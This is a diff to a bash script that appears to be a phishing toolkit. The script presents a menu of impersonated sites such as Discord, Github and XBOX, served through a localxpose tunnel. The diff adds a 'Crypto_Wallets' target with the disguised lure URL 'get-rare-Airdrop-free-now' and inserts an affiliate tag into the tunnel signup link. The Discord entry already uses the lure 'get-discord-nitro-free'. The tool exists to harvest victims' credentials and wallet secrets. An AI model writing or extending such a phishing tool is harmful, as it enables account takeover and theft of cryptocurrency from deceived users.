@@ -335,7 +335,7 @@ localxpose_auth() {
 	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 
 
 	[ "$(./.server/loclx account status | grep Error)" ] && {
-		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
+		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}https://localxpose.io/?via=enthernet${GREEN} & copy the token\n"
 		sleep 3
 		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx Token :${ORANGE} " loclx_token
 		[[ $loclx_token == "" ]] && {
@@ -549,7 +549,7 @@ main_menu() {
 		${RED}[${CYAN}09${RED}]${BLUE} Playstation   ${RED}[${CYAN}19${RED}]${ORANGE} Reddit       ${RED}[${CYAN}29${RED}]${BLUE} Vk
 		${RED}[${CYAN}10${RED}]${BLUE} Tiktok        ${RED}[${CYAN}20${RED}]${ORANGE} Adobe        ${RED}[${CYAN}30${RED}]${BLUE} XBOX
 		${RED}[${CYAN}31${RED}]${BLUE} Mediafire     ${RED}[${CYAN}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${BLUE} Github
-		${RED}[${CYAN}34${RED}]${BLUE} Discord
+		${RED}[${CYAN}34${RED}]${BLUE} Discord       ${RED}[${CYAN}35${RED}]${ORANGE} Crypto_Wallets
 
 		${RED}[${ORANGE}99${RED}]${GREEM} ABOUT         ${RED}[${ORANGE}00${RED}]${GREEN} Exit
 
@@ -685,6 +685,10 @@ main_menu() {
                 34)
                         website="discord"
                         mask='http://get-discord-nitro-free'
+                        tunnel_menu;;
+                35)
+                        website="crypto_wallets"
+                        mask='http://get-rare-Airdrop-free-now'
                         tunnel_menu;;
                 99)
                         about;;
